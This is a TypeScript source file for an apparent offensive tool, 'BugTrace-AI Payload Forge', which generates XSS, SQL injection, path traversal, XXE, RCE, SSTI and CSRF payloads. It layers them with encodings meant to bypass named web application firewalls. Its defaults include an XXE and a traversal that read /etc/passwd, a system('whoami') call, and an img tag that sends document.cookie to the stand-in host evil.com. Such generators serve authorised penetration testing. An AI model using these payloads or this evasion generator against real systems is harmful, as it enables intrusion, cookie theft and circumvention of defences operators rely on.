/**
 * BugTrace-AI Payload Forge
 * Advanced payload generation with 14+ obfuscation techniques for WAF bypass
 * @module payload/payload-forge
 */

import { Obfuscator, ObfuscationTechnique } from '../utils/obfuscation';

export type PayloadType = 'xss' | 'sqli' | 'lfi' | 'rce' | 'xxe' | 'ssti' | 'csrf';

export interface PayloadOptions {
  type: PayloadType;
  base?: string;
  target?: string;  // WAF type: ModSecurity, Cloudflare, AWS WAF, etc.
  context?: string; // HTML, JavaScript, SQL, etc.
  variations?: number;
  techniques?: ObfuscationTechnique[];
}

export interface Payload {
  original: string;
  obfuscated: string;
  technique: string;
  description: string;
  bypassTarget: string[];
}

/**
 * PayloadForge - Advanced payload generation with WAF bypass techniques
 */
export class PayloadForge {
  private obfuscator: Obfuscator;

  constructor() {
    this.obfuscator = new Obfuscator();
  }

  /**
   * Generate payloads with multiple obfuscation techniques
   */
  generate(options: PayloadOptions): Payload[] {
    const basePayload = options.base || this.getDefaultPayload(options.type);
    const variations = options.variations || 10;
    const techniques = options.techniques || this.getAllTechniques();

    const payloads: Payload[] = [];

    // Generate base payload
    payloads.push({
      original: basePayload,
      obfuscated: basePayload,
      technique: 'none',
      description: 'Base payload without obfuscation',
      bypassTarget: []
    });

    // Generate obfuscated variations
    for (let i = 0; i < Math.min(variations, techniques.length); i++) {
      const technique = techniques[i];
      const obfuscated = this.obfuscator.obfuscate(basePayload, technique, options.context);

      payloads.push({
        original: basePayload,
        obfuscated,
        technique,
        description: this.getTechniqueDescription(technique),
        bypassTarget: this.getBypassTargets(technique)
      });
    }

    // Generate multi-layered obfuscation
    if (variations > techniques.length) {
      const multiLayer = this.generateMultiLayered(basePayload, techniques, options.context);
      payloads.push(...multiLayer);
    }

    return payloads;
  }

  /**
   * Get default payload for vulnerability type
   */
  private getDefaultPayload(type: PayloadType): string {
    const defaults: Record<PayloadType, string> = {
      xss: '<script>alert(1)</script>',
      sqli: "' OR '1'='1",
      lfi: '../../../etc/passwd',
      rce: 'system("whoami")',
      xxe: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      ssti: '{{7*7}}',
      csrf: '<img src="http://evil.com/steal.php?cookie=" onerror="this.src+=document.cookie">'
    };

    return defaults[type] || '<script>alert(1)</script>';
  }

  /**
   * Get all obfuscation techniques
   */
  private getAllTechniques(): ObfuscationTechnique[] {
    return [
      'unicode',
      'html-entity',
      'string-concat',
      'comment-insertion',
      'case-variation',
      'hex-encoding',
      'octal-encoding',
      'base64',
      'jsfuck',
      'double-encoding',
      'null-byte',
      'mixed-encoding',
      'context-specific',
      'protocol-switch'
    ];
  }

  /**
   * Get technique description
   */
  private getTechniqueDescription(technique: ObfuscationTechnique): string {
    const descriptions: Record<ObfuscationTechnique, string> = {
      'unicode': 'Unicode character encoding to bypass pattern matching',
      'html-entity': 'HTML entity encoding for special characters',
      'string-concat': 'String concatenation to break signature patterns',
      'comment-insertion': 'Comment insertion within payload',
      'case-variation': 'Mixed case characters to bypass case-sensitive filters',
      'hex-encoding': 'Hexadecimal encoding of characters',
      'octal-encoding': 'Octal encoding of characters',
      'base64': 'Base64 encoding with dynamic decoding',
      'jsfuck': 'JSFuck encoding using only 6 characters',
      'double-encoding': 'Double URL encoding to bypass decode-once filters',
      'null-byte': 'Null byte injection to terminate parsing',
      'mixed-encoding': 'Multiple encoding techniques combined',
      'context-specific': 'Context-aware obfuscation based on injection point',
      'protocol-switch': 'Protocol switching to bypass URL filters'
    };

    return descriptions[technique] || 'Unknown technique';
  }

  /**
   * Get WAF bypass targets for technique
   */
  private getBypassTargets(technique: ObfuscationTechnique): string[] {
    const targets: Record<ObfuscationTechnique, string[]> = {
      'unicode': ['ModSecurity', 'Generic WAFs'],
      'html-entity': ['Cloudflare', 'ModSecurity'],
      'string-concat': ['AWS WAF', 'Azure WAF'],
      'comment-insertion': ['ModSecurity', 'Generic WAFs'],
      'case-variation': ['Basic filters', 'Blacklist filters'],
      'hex-encoding': ['ModSecurity', 'Custom WAFs'],
      'octal-encoding': ['ModSecurity', 'Custom WAFs'],
      'base64': ['Generic WAFs', 'Content filters'],
      'jsfuck': ['All JavaScript filters'],
      'double-encoding': ['IIS filters', 'Apache filters'],
      'null-byte': ['Legacy filters', 'PHP filters'],
      'mixed-encoding': ['Advanced WAFs', 'Multi-layer filters'],
      'context-specific': ['Context-aware WAFs'],
      'protocol-switch': ['URL filters', 'Protocol filters']
    };

    return targets[technique] || ['Generic'];
  }

  /**
   * Generate multi-layered obfuscation
   */
  private generateMultiLayered(
    basePayload: string,
    techniques: ObfuscationTechnique[],
    context?: string
  ): Payload[] {
    const multiLayered: Payload[] = [];

    // Combine 2-3 techniques
    const combinations = [
      ['unicode', 'html-entity'],
      ['case-variation', 'comment-insertion'],
      ['hex-encoding', 'string-concat'],
      ['double-encoding', 'null-byte']
    ] as ObfuscationTechnique[][];

    combinations.forEach(combo => {
      let payload = basePayload;
      const techniqueNames: string[] = [];
      const bypassTargets = new Set<string>();

      combo.forEach(tech => {
        payload = this.obfuscator.obfuscate(payload, tech, context);
        techniqueNames.push(tech);
        this.getBypassTargets(tech).forEach(target => bypassTargets.add(target));
      });

      multiLayered.push({
        original: basePayload,
        obfuscated: payload,
        technique: techniqueNames.join(' + '),
        description: `Multi-layered: ${techniqueNames.join(', ')}`,
        bypassTarget: Array.from(bypassTargets)
      });
    });

    return multiLayered;
  }

  /**
   * Generate report of payloads
   */
  generateReport(payloads: Payload[]): string {
    let report = '═══════════════════════════════════════════════════════\n';
    report += '            PAYLOAD FORGE REPORT\n';
    report += '═══════════════════════════════════════════════════════\n\n';

    report += `Total Payloads Generated: ${payloads.length}\n\n`;

    payloads.forEach((payload, index) => {
      report += `[${index + 1}] ${payload.technique.toUpperCase()}\n`;
      report += `Description: ${payload.description}\n`;
      report += `Bypass Target: ${payload.bypassTarget.join(', ') || 'None'}\n`;
      report += `Payload: ${payload.obfuscated}\n`;
      report += '-'.repeat(60) + '\n';
    });

    return report;
  }
}

export default PayloadForge;
